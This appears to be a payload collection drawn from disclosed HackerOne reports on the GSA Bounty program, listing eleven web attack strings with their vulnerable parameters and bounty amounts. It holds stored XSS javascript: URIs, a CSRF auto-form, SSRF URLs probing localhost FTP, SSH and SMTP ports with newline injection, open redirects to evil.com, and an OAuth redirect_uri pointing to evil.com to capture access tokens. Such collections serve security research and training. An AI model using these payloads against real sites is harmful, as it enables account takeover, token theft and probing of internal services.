# GSA Bounty

11 payloads.

### `802104e7`

```
javascript:alert(document.domain)
```

**Parameter:** `customDomain`
— [Double Stored Cross-Site scripting in the admin panel](https://hackerone.com/reports/245172) · GSA Bounty · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `bd5c60ff`

```
javascript:alert(document.domain);
```

**Parameter:** `customDomain`
— [Double Stored Cross-Site scripting in the admin panel](https://hackerone.com/reports/245172) · GSA Bounty · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `40581d20`

```
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://target.com/manage/personal_key">
      <input type="hidden" name="resend" value="true" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

— [CSRF in generating a new Personal Key](https://hackerone.com/reports/263512) · GSA Bounty · [streaak](https://hackerone.com/streaak)

### `1b7f372d`

```
http://localhost:25
```

— [SSRF/XSPA in target.com/dashboard/validate](https://hackerone.com/reports/272095) · GSA Bounty · [haxta4ok00](https://hackerone.com/haxta4ok00) · $300.0

### `f297cae7`

```
https://target.com//evil.com/..;/css
```

— [\[target.com\] Open Redirect](https://hackerone.com/reports/387007) · GSA Bounty · [bobrov](https://hackerone.com/bobrov) · $150.0

### `fc07d832`

```
GET /help_docs?url=http://127.0.0.1:21/?%0Ahttps%3A%2F%2Ftarget.com%2Fmanual%2Faccount.html HTTP/1.1
    (snip)
```

**Parameter:** `url`
— [SSRF in target.com via ?url= parameter](https://hackerone.com/reports/514224) · GSA Bounty · [niwasaki](https://hackerone.com/niwasaki) · $150.0

### `625f12ff`

```
GET /help_docs?url=http://127.0.0.1:22/?%0Ahttps%3A%2F%2Ftarget.com%2Fmanual%2Faccount.html HTTP/1.1
    (snip)
```

**Parameter:** `url`
— [SSRF in target.com via ?url= parameter](https://hackerone.com/reports/514224) · GSA Bounty · [niwasaki](https://hackerone.com/niwasaki) · $150.0

### `7fb61425`

```
http://127.0.0.1:21/?%0A
```

**Parameter:** `url`
— [SSRF in target.com via ?url= parameter](https://hackerone.com/reports/514224) · GSA Bounty · [niwasaki](https://hackerone.com/niwasaki) · $150.0

### `fd1f4dff`

```
http://127.0.0.1:22/?%0A
```

**Parameter:** `url`
— [SSRF in target.com via ?url= parameter](https://hackerone.com/reports/514224) · GSA Bounty · [niwasaki](https://hackerone.com/niwasaki) · $150.0

### `95a2171c`

```
https://target.com/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███
```

**Parameter:** `redirect_uri`
— [Stealing Users OAuth Tokens through redirect_uri parameter](https://hackerone.com/reports/665651) · GSA Bounty · [manshum12](https://hackerone.com/manshum12) · $750.0

### `1107b431`

```
https://target.com/?nonce=wI0UglN84A06Q4z4JnkZVc3i1V8%3D&redirect_uri=https%3A%2F%2Fevil2.com%23%40secure.evil.com%2Flogin%2Fpiv_cac
```

**Parameter:** `redirect_uri`
— [open redirect in target.com](https://hackerone.com/reports/798742) · GSA Bounty · [timwhite](https://hackerone.com/timwhite) · $150.0
